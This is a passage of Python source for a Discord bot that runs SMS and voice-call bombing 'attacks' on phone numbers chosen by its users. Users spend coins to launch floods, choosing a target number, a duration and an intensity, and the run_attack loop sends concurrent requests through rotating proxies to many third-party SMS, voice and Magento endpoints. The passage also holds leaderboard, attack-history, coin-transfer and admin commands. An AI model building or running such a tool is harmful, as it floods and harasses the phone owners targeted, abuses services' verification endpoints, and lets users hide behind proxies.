    embed.add_field(name="👥 Total Users", value=f"**{total_users}**", inline=True)
    embed.add_field(name="🎯 Total Attacks", value=f"**{total_attacks}**", inline=True)
    embed.add_field(name="💰 Total Coins", value=f"**{total_coins}**", inline=True)
    embed.add_field(name="⚡ Active Attacks", value=f"**{len(bot.active_attacks)}**", inline=True)
    embed.add_field(name="📡 APIs", value=f"**{len(ALL_APIS)}**", inline=True)
    embed.add_field(name="🔄 Proxy Pool", value=f"**{len(bot.proxy_list)}**", inline=True)
    
    if api_stats:
        embed.add_field(name="API Success Rate", value=f"**{api_stats[0].get('avg_success_rate', 0):.1f}%**", inline=True)
    
    embed.set_footer(text=f"Uptime: {datetime.now() - bot.start_time}")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פקודת leaderboard ==========
async def show_leaderboard(interaction: discord.Interaction):
    cursor = users_col.find().sort("tokens", -1).limit(10)
    top_users = await cursor.to_list(length=10)
    
    embed = discord.Embed(
        title="🏆 Top 10 Richest Users",
        color=0xFFD700,
        timestamp=datetime.now()
    )
    
    if not top_users:
        embed.description = "No users yet"
    else:
        ranking = ""
        for i, user in enumerate(top_users, 1):
            medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
            user_id = user['user_id']
            username = "Unknown"
            
            # נסה למצוא את המשתמש בשרת
            try:
                member = await interaction.guild.fetch_member(int(user_id))
                if member:
                    username = member.display_name
            except:
                username = f"User {user_id[:6]}"
            
            attacks = await attacks_col.count_documents({"user_id": user_id})
            ranking += f"{medal} **{username}** • **{user['tokens']}** 💎 • 🎯 {attacks}\n"
        
        embed.description = ranking
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== מתקפה ==========
class AttackModal(ui.Modal, title="Start Spamming"):
    phone = ui.TextInput(
        label="Phone Number",
        placeholder="972501234567",
        default="972501234567"
    )
    duration = ui.TextInput(
        label="Duration (minutes)",
        default="5",
        placeholder="1-60"
    )
    attack_type = ui.TextInput(
        label="Attack Type",
        default="all",
        placeholder="magento / sms / voice / all"
    )
    intensity = ui.TextInput(
        label="Intensity (1-10)",
        default="5",
        placeholder="5"
    )

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        attack_type = self.attack_type.value.strip().lower()
        
        # פורמט מספר
        if phone.startswith("0"):
            phone = "972" + phone[1:]
        elif not phone.startswith("972"):
            phone = "972" + phone
        
        if attack_type not in ["magento", "sms", "voice", "all"]:
            await interaction.response.send_message("❌ Invalid type. Choose: magento/sms/voice/all", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 60:
                await interaction.response.send_message("❌ Duration must be 1-60 minutes", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ Invalid duration", ephemeral=True)
            return
        
        try:
            intensity = int(self.intensity.value)
            if intensity < 1 or intensity > 10:
                intensity = 5
        except:
            intensity = 5
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({
                "user_id": user_id,
                "tokens": 200,
                "created_at": datetime.now(),
                "machine_id": get_machine_id()
            })
            user_doc = {"tokens": 200}
        
        cost = max(1, duration // 5)
        if user_doc.get("tokens", 0) < cost:
            await interaction.response.send_message(f"❌ Not enough coins! Need {cost}, have {user_doc.get('tokens', 0)}", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -cost}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        # שמירת התקפה במסד
        await attacks_col.insert_one({
            "attack_id": attack_id,
            "user_id": user_id,
            "username": str(interaction.user),
            "phone": phone,
            "duration": duration,
            "type": attack_type,
            "intensity": intensity,
            "cost": cost,
            "started_at": datetime.now(),
            "status": "running"
        })
        
        embed = discord.Embed(
            title="🚀 Attack Launched!",
            description=f"**Phone:** `{phone}`\n**Duration:** `{duration} minutes`\n**Type:** `{attack_type}`\n**Intensity:** `{intensity}/10`\n**Cost:** `{cost}` coins",
            color=0x00FF00,
            timestamp=datetime.now()
        )
        embed.add_field(name="Coins Left", value=f"**{user_doc['tokens'] - cost}**", inline=True)
        embed.add_field(name="Attack ID", value=f"`{attack_id[:8]}`", inline=True)
        embed.set_footer(text=f"Transaction ID: {generate_transaction_id()}")
        
        await interaction.response.send_message(embed=embed, ephemeral=True)
        
        asyncio.create_task(run_attack(phone, duration, attack_type, intensity, user_id, interaction, attack_id))

async def run_attack(phone, duration_mins, attack_type, intensity, user_id, interaction, attack_id):
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    total_success = 0
    total_failed = 0
    
    if attack_type == "magento":
        apis = MAGENTO_APIS
    elif attack_type == "sms":
        apis = SMS_APIS
    elif attack_type == "voice":
        apis = VOICE_APIS
    else:
        apis = ALL_APIS
    
    # מהירות לפי intensity
    delay = 1.0 / (intensity * 2)
    batch_size = max(1, intensity // 2)
    
    sessions = [aiohttp.ClientSession() for _ in range(3)]
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                break
            
            tasks = []
            apis_to_use = random.sample(apis, min(batch_size * 3, len(apis)))
            
            for session in sessions:
                for api in apis_to_use[:batch_size]:
                    proxy = random.choice(bot.proxy_list) if bot.proxy_list else None
                    
                    if api.get("type") == "magento":
                        tasks.append(send_magento(session, api["url"], phone_raw, proxy))
                    else:
                        tasks.append(send_api(session, api, phone, phone_raw, proxy))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for r in results:
                if r is True:
                    total_success += 1
                elif r is False:
                    total_failed += 1
                total_sent += 1
            
            # עדכון סטטוס כל 30 שניות
            if total_sent % 50 == 0:
                await attacks_col.update_one(
                    {"attack_id": attack_id},
                    {"$set": {
                        "sent": total_sent,
                        "success": total_success,
                        "failed": total_failed,
                        "progress": (datetime.now() - (end_time - timedelta(minutes=duration_mins))) / timedelta(minutes=duration_mins) * 100
                    }}
                )
            
            await asyncio.sleep(delay)
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    # עדכון סיום
    await attacks_col.update_one(
        {"attack_id": attack_id},
        {"$set": {
            "status": "completed",
            "ended_at": datetime.now(),
            "sent": total_sent,
            "success": total_success,
            "failed": total_failed,
            "success_rate": (total_success / total_sent * 100) if total_sent > 0 else 0
        }}
    )
    
    await interaction.followup.send(
        f"✅ **Attack Finished!**\n"
        f"📊 **Results:** {total_sent} total\n"
        f"✅ **Success:** {total_success}\n"
        f"❌ **Failed:** {total_failed}\n"
        f"📈 **Rate:** {(total_success/total_sent*100) if total_sent>0 else 0:.1f}%",
        ephemeral=True
    )

# ========== פקודת stop ==========
@bot.tree.command(name="stop", description="עצור את כל המתקפות")
async def stop_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    stopped = 0
    
    for attack_id in list(bot.active_attacks.keys()):
        if attack_id.startswith(user_id):
            bot.active_attacks[attack_id] = False
            await attacks_col.update_one(
                {"attack_id": attack_id},
                {"$set": {"status": "stopped", "stopped_at": datetime.now()}}
            )
            stopped += 1
    
    embed = discord.Embed(
        title="🛑 Attacks Stopped",
        description=f"Stopped **{stopped}** active attacks",
        color=0xFFA500
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פקודת tokens ==========
@bot.tree.command(name="tokens", description="בדוק טוקנים")
async def tokens(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    tokens = user_doc.get("tokens", 0) if user_doc else 0
    
    user_attacks = await attacks_col.count_documents({"user_id": user_id})
    
    embed = discord.Embed(
        title="💰 Token Balance",
        description=f"You have **{tokens}** coins",
        color=0x5865F2,
        timestamp=datetime.now()
    )
    embed.add_field(name="Total Attacks", value=f"**{user_attacks}**", inline=True)
    
    if user_doc and user_doc.get("last_claim"):
        last_claim = user_doc["last_claim"]
        if isinstance(last_claim, str):
            last_claim = datetime.fromisoformat(last_claim)
        
        next_claim = last_claim + timedelta(hours=24)
        if next_claim > datetime.now():
            remaining = next_claim - datetime.now()
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            embed.add_field(name="Next Free Coin", value=f"**{hours}h {minutes}m**", inline=True)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פקודת history ==========
@bot.tree.command(name="history", description="📜 היסטוריית מתקפות")
async def history(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    
    cursor = attacks_col.find({"user_id": user_id}).sort("started_at", -1).limit(5)
    attacks = await cursor.to_list(length=5)
    
    embed = discord.Embed(
        title="📜 Attack History",
        color=0x5865F2,
        timestamp=datetime.now()
    )
    
    if not attacks:
        embed.description = "No attacks yet"
    else:
        for attack in attacks:
            status = "✅" if attack.get("status") == "completed" else "🛑" if attack.get("status") == "stopped" else "⚡"
            date = attack["started_at"].strftime("%m/%d %H:%M") if isinstance(attack["started_at"], datetime) else "Unknown"
            sent = attack.get("sent", 0)
            embed.add_field(
                name=f"{status} {date} - {attack.get('type', 'unknown')}",
                value=f"📱 {attack.get('phone', 'N/A')}\n📊 {sent} messages",
                inline=True
            )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פקודת transfer ==========
@bot.tree.command(name="transfer", description="💸 העבר טוקנים למשתמש אחר")
async def transfer(interaction: discord.Interaction, user: discord.User, amount: int):
    if amount <= 0:
        await interaction.response.send_message("❌ Amount must be positive", ephemeral=True)
        return
    
    sender_id = str(interaction.user.id)
    receiver_id = str(user.id)
    
    if sender_id == receiver_id:
        await interaction.response.send_message("❌ Cannot transfer to yourself", ephemeral=True)
        return
    
    sender = await users_col.find_one({"user_id": sender_id})
    if not sender or sender.get("tokens", 0) < amount:
        await interaction.response.send_message("❌ Not enough coins", ephemeral=True)
        return
    
    # העברה
    await users_col.update_one({"user_id": sender_id}, {"$inc": {"tokens": -amount}})
    await users_col.update_one({"user_id": receiver_id}, {"$inc": {"tokens": amount}}, upsert=True)
    
    # לוג
    await logs_col.insert_one({
        "type": "transfer",
        "sender_id": sender_id,
        "sender_name": str(interaction.user),
        "receiver_id": receiver_id,
        "receiver_name": str(user),
        "amount": amount,
        "timestamp": datetime.now(),
        "transaction_id": generate_transaction_id()
    })
    
    embed = discord.Embed(
        title="💸 Transfer Successful",
        description=f"Transferred **{amount}** coins to {user.mention}",
        color=0x00FF00,
        timestamp=datetime.now()
    )
    embed.add_field(name="Your New Balance", value=f"**{sender['tokens'] - amount}**", inline=True)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פקודת admin (לאדמינים) ==========
@bot.tree.command(name="admin", description="👑 פאנל אדמין")
@app_commands.default_permissions(administrator=True)
async def admin_panel(interaction: discord.Interaction):
    total_users = await users_col.count_documents({})
    total_attacks = await attacks_col.count_documents({})
    total_logs = await logs_col.count_documents({})
    
    # סטטיסטיקות
    pipeline = [
        {"$group": {
            "_id": None,
            "total_coins": {"$sum": "$tokens"},
            "avg_coins": {"$avg": "$tokens"}
        }}
    ]
    stats = await users_col.aggregate(pipeline).to_list(1)
    
    embed = discord.Embed(
        title="👑 Admin Panel",
        color=0x5865F2,
        timestamp=datetime.now()
    )
    embed.add_field(name="👥 Users", value=f"**{total_users}**", inline=True)
    embed.add_field(name="🎯 Attacks", value=f"**{total_attacks}**", inline=True)
    embed.add_field(name="📝 Logs", value=f"**{total_logs}**", inline=True)
    
    if stats:
        embed.add_field(name="💰 Total Coins", value=f"**{stats[0].get('total_coins', 0)}**", inline=True)
        embed.add_field(name="📊 Avg Coins", value=f"**{stats[0].get('avg_coins', 0):.1f}**", inline=True)
    
    embed.add_field(name="⚡ Active Attacks", value=f"**{len(bot.active_attacks)}**", inline=True)
    embed.add_field(name="📡 APIs", value=f"**{len(ALL_APIS)}**", inline=True)
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== הרצת הבוט ==========
if __name__ == "__main__":
    logging.info("🚀 Starting Just Spam Bot...")
    bot.run(TOKEN)
